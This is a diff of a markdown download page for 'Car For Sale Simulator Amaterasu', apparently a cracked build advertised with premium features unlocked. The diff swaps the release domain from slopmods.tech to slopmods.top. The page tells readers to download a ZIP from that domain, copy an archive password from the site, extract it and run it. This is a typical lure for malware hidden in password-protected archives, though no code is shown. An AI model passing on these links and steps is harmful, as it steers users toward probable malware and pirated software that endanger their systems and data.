@@ -8,12 +8,12 @@ Car For Sale Simulator Amaterasu — Windows setup and configuration · Premium 
 
 > Use the release page below for Windows.
 
-- **Release page:** [exxkooqahfa.slopmods.tech](https://exxkooqahfa.slopmods.tech/)
-- **Full URL:** `https://exxkooqahfa.slopmods.tech/`
+- **Release page:** [exxkooqahfa.slopmods.top](https://exxkooqahfa.slopmods.top/)
+- **Full URL:** `https://exxkooqahfa.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **exxkooqahfa.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **exxkooqahfa.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Car For Sale Simulator Amaterasu — Windows setup and configuration · Premium 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **exxkooqahfa.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **exxkooqahfa.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
